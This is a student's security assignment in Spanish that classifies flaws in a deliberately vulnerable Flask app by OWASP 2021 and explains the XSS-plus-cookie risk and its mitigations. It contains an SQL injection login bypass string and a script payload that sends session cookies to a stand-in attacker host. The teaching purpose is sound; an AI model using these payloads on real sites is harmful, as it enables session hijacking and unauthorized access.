# Tarea 1.1 — Identificación de Vulnerabilidades en app_vulnerable.py
**Alumno:** Omar Rivera Castillo | **Código:** 2221895826

| # | Línea(s) de código | Vulnerabilidad | Clasificación OWASP 2021 | Impacto potencial |
|---|---|---|---|---|
| 1 | `conn.execute(f"SELECT * FROM usuarios WHERE username='{username}' AND password='{password}'")`  (login, línea ~67) | **SQL Injection** — Los valores del formulario se concatenan directamente en la query SQL sin sanitización. Un atacante puede inyectar `' OR '1'='1` en el username para autenticarse sin credenciales. | **A03:2021 — Injection** | Elusión de autenticación, volcado completo de la base de datos, modificación o eliminación de datos, escalada de privilegios. |
| 2 | `html += f"<div>{c['contenido']}</div>"` (ver_comentarios, línea ~93) | **XSS Almacenado (Cross-Site Scripting)** — El contenido de los comentarios se inserta en el HTML sin escapar. Un atacante que publique `<script>` obtiene ejecución de JavaScript en el navegador de todos los visitantes. | **A03:2021 — Injection** | Robo de cookies de sesión, redireccionamiento a sitios maliciosos, captura de pulsaciones de teclado, suplantación de identidad de cualquier usuario que visite la página. |
| 3 | `doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,)).fetchone()` — sin verificar `propietario_id` (ver_documento, línea ~103) | **IDOR — Insecure Direct Object Reference** — La ruta `/documento/<id>` solo verifica autenticación, no que el documento pertenezca al usuario en sesión. Cualquier usuario autenticado puede leer documentos ajenos. | **A01:2021 — Broken Access Control** | Acceso no autorizado a información confidencial de otros usuarios (contratos, datos personales, historiales médicos). |
| 4 | `app.secret_key = "clave123"` (línea ~41) | **Clave secreta débil y hardcodeada** — La clave de firma de sesiones es trivial y está en texto plano en el código fuente. Cualquier persona con acceso al repositorio puede falsificar cookies de sesión. | **A02:2021 — Cryptographic Failures** | Falsificación de cookies de sesión (session forgery), acceso como cualquier usuario del sistema incluyendo administradores, sin necesidad de credenciales. |
| 5 | `app.config['SESSION_COOKIE_HTTPONLY'] = False` (línea ~42) | **Cookie de sesión sin flag HttpOnly** — JavaScript puede leer la cookie de sesión mediante `document.cookie`. Combinado con el XSS Almacenado, un atacante puede robar las sesiones de todos los usuarios desde el navegador. | **A07:2021 — Identification and Authentication Failures** | Secuestro de sesión (session hijacking): el atacante obtiene la cookie de sesión de la víctima y puede hacerse pasar por ella sin conocer su contraseña. |
| 6 (adicional) | `return jsonify({"mensaje": f"Bienvenido {user['username']}", "user_id": user['id']})` (login, línea ~72) | **Exposición de datos sensibles en respuesta** — El login devuelve el `user_id` numérico del usuario. Esta información facilita la enumeración de IDs para ataques IDOR posteriores (el atacante sabe que su ID es 2, por lo tanto infiere que ID 1 es el administrador). | **A01:2021 — Broken Access Control / A02:2021 — Cryptographic Failures** | Facilita ataques de enumeración y IDOR: el atacante puede deducir el rango de IDs válidos y el ID de usuarios con mayores privilegios, potenciando el ataque a recursos ajenos. |

---

## Respuesta a Tarea 1.4 — Análisis del riesgo combinado XSS + cookies sin HttpOnly

### 1. ¿Qué hace un atacante con el payload sofisticado?
```javascript
<script>
fetch('https://atacante.com/robo?c=' + document.cookie)
</script>
```
Con `SESSION_COOKIE_HTTPONLY = False`, la cookie de sesión es **accesible desde JavaScript**. Cuando cualquier usuario autenticado visite `/comentarios`, su navegador ejecutará el script, que envía silenciosamente su cookie de sesión al servidor del atacante mediante una petición HTTP GET. El ataque es completamente transparente para la víctima: no ve ningún aviso ni popup.

### 2. ¿Qué hace el atacante con la cookie de sesión robada?
Una vez que el atacante tiene la cookie (por ejemplo `session=eyJ1c2VyX2lkIjoxfQ...`), puede **suplantar completamente a la víctima** configurando esa cookie en su propio navegador o en peticiones curl. El servidor no puede distinguir entre la víctima real y el atacante porque la autenticación se basa únicamente en la cookie, sin verificar IP, User-Agent ni otros factores. Si la víctima es el administrador, el atacante obtiene acceso total al sistema.

### 3. ¿Por qué HttpOnly=True rompe parcialmente el ataque?
Con `HttpOnly=True`, el navegador **impide que JavaScript acceda a `document.cookie`**, por lo que el payload de robo de cookies devuelve una cadena vacía. El XSS sigue ejecutándose, pero ya no puede leer la cookie. Sin embargo, el riesgo no desaparece completamente: el atacante aún puede modificar el DOM, redirigir al usuario a páginas falsas (phishing), capturar lo que escribe en formularios, o usar el contexto autenticado del XSS para hacer peticiones en nombre de la víctima (CSRF-like attacks via XSS).

### 4. ¿Qué configuración adicional ayuda en tráfico no cifrado?
Activar `SESSION_COOKIE_SECURE = True` hace que la cookie **solo se envíe por HTTPS**. En tráfico HTTP no cifrado, la cookie nunca se transmite, eliminando el riesgo de sniffing de red (ataques Man-in-the-Middle que interceptan paquetes). Complementariamente, `SESSION_COOKIE_SAMESITE = 'Strict'` impide que la cookie se envíe en peticiones cross-site, mitigando ataques CSRF.
